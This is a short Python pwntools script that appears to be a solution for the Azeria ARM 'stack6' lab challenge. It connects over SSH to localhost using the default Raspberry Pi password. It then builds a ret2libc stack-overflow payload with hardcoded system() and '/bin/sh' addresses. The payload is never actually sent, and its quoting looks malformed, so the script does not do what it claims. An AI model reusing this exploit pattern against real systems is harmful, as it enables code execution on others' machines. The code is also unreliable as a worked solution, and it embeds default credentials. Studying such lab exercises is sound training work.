#!/usr/bin/python3
from pwn import *
# change port for your machine
s = ssh(host='localhost', user='pi', password='raspberry', port=5022)
# overflowing the buffer modifies the stack
binsh = p32(0xb6f914d8)
system = p32(0xb6eab154)
exploit = b'python -c \'print "a"*64+"\x90"*12+""\''
exploit += system+b'"+"'+binsh+b'" | '
exploit += b'~/binary-exploitation-solution-scripts/azeriaARMchallenges/stack6sol/stack6'
sh = s.shell('bash')
sh.interactive()
s.close()